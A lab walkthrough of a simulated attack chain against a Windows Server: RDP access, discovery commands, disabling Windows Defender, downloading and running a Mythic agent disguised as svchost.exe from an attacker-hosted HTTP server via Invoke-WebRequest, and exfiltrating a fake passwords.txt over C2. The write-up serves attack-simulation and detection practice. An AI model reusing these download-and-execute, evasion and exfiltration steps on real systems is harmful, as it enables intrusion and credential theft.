## Logical Diagram and Attack Path Understanding

Here for an easy understanding our attack path I created a logical diagram which would allow us to have a smooth workflow towards out goal of successful data exfiltration from target machine.
  
Our attack path can be visualized as follows:  

![](2025-03-26-9.2.2---C2-Attack-1.png)

**Attack Path Explanation**  
Our attack path consists of six phases:  
  
1. **Initial Access**: We will use our Kali Linux machine to perform an RDP Brute Force attack towards our Windows Server. Our goal is to obtain a successful authentication towards our Windows Server.  
2. **Discovery**: Once we have gained initial access, we will perform some Discovery commands to gather information about the system. These commands include:  
	* `whoami`   
	* `ipconfig`  
	* `net user`  
	* `net group`  
3. **Defense Evasion**: With an RDP established session, we will disable Windows Defender on our Windows Server to evade detection.  
4. **Execution**: We will use PowerShell Invoke-WebRequest to download our Mythic agent on our Windows client. Once the Mythic agent is downloaded, we will execute it.  
5. **Command and Control**: With a successful established C2 session, we will be able to communicate with our Windows client and execute further commands.  
6. **Exfiltration**: Finally, we will use the existing C2 session to download a fake password file called `password.txt` from our Windows server. This will complete our attack path.  
  
**Assumptions**  
For the purpose of this challenge, we will assume that we have found a successful credential and have gained initial access to the target machine using an RDP brute force attack. (Done in RDP Simulation part of our project). Thus completing our Phase 1.

## Phase 2 - Discovery
  
Once an attacker gains access to a target system, they typically perform initial reconnaissance by running basic commands to gather insights about the environment. These commands help them understand the systemâ€™s configuration, user privileges, and network details. Examples include:  

| **Information**           | **Commands**       |
| ------------------------- | ------------------ | 
| **Current user**          | `whoami`           |
| **User permissions**      | `whoami /all`      |
| **IP Address**            | `ipconfig`         |
| **Users**                 | `net user`         |
| **Groups**                | `net localgroup`   |
| **User group membership** | `net user j.smith` |
  
These commands provide critical information that can be used to escalate privileges, move laterally, or plan further attacks.  
  
**Connecting to the Target Machine**
To perform these actions, connect to the target machine using **`xfreerdp3`** from your Kali Linux Attacker Machine, as done previously.  

```
xfreerdp3 /v:192.168.125.30 /port:3389 /u:"j.smith" /p:"1234" /cert:ignore -clipboard
```

**Gathering Insights**
1. Open **Command Prompt** by pressing the **Windows key** and searching for it.  
2. Run the commands listed above one by one to collect system and user information.

## Phase 3 - Defense Evasion

To streamline the process for this project, we will conduct Defense Evasion by disabling Windows Defender using GNU. This approach is straightforward and practical, given that we already have an RDP connection established to the target machine.

**Disable Windows Defender via GUI**

1. Press the **Windows key** and search for **"Windows Security,"** then open the application.  
2. Navigate to **Virus & Threat Protection** in the menu.  
3. Under **Virus & Threat Protection Settings**, click on **Manage Settings**.  
4. Disable the following options:  
	- **Real-time scanning**  
	- **Cloud-delivered protection**  
	- **Automatic sample submission**  
	- **Tamper Protection**

For those looking to replicate this step in a real-world adversary scenario, you can achieve the same result by following this guide [here](https://powershellfaqs.com/disable-windows-defender-using-powershell/).

## Phase 4 - Execution
  
Head over to the directory where we downloaded the payload file. From here we can use an HTTP module that Python offers to server the file on port 9999 in the network using following command:

```
python3 -m http.server 9999
```

![](2025-03-26-9.2.2---C2-Attack-5.png)

After which we can head over to our target machine and open PowerShell. Here we will be using `iwr` an alias for the `Invoke-WebRequest` cmdlet, which will send a web request on given URL and if specified save output to a location given.

```
Invoke-WebRequest -Uri http://192.168.125.60:9999/svchost.exe -OutFile "C:\Users\Public\Downloads\svchost.exe"
```

Once the binary is downloaded on target we will run it using `Start-Process` cmdlet, which will start a process from given file path with `-NoNewWindow` to ensures the process runs in the background without opening a new window and `-PassThru` returns the process object.

```
Start-Process -FilePath "C:\Users\Public\Downloads\svchost.exe" -NoNewWindow -PassThru
```

Once the command runs, we should in theory get a connection. So, If we were to type in `netstat -ano`, we would see "Established" along side our `svchost.exe` service name in list.

## Phase 5 - Command & Control

**Interacting with the Agent**  

In Mythic, Click on the "telephone" icon and we would see our active callback right in here, with the username, last check-in and process ID.  

To begin interacting with the agent, Click on the "keyboard" icon in the Interact column near interact ID, and then we can run some tasks in the bottom tab by giving command to run and wait for agent to give a callback and answer.

You can find the list of commands you can run from GitHub page for Apollo Agent or from Docs page in mythic itself.

## Phase 6 - Exfiltration

**Pre-requisite**

For this step we have a pre-requisite for a fake passwords.txt file on our target machine. So now we will create a fake passwords.txt file in order to demonstrate the phase 6 of exfiltration.

Head over to our Client machine (windows machine) and open "Command Prompt" and go to `C:\Users\Public\Documents\` a public directory where everyone can puts files on the computer.

Now create a "passwords.txt" file using notepad and put our j.smith user credentials in it.

**Action On Objectives (Exfiltration)**

Now let's see if we can pull that off using our C2 session. For this we can use `download` command to download the file from target.

```
download C:\Users\Public\Documents\password.txt
```

Once the callback and action is complete which we can notice from the indication color line before the command which will turn from blue to green when command has finished running and output is returned.  

![](2025-03-26-9.2.2---C2-Attack-10.png)

Now to checkout the downloaded file click on the "paperclip" icon and we would see that the file is right here under downloads. From here you can open the file and see that the password is that is `1234`.
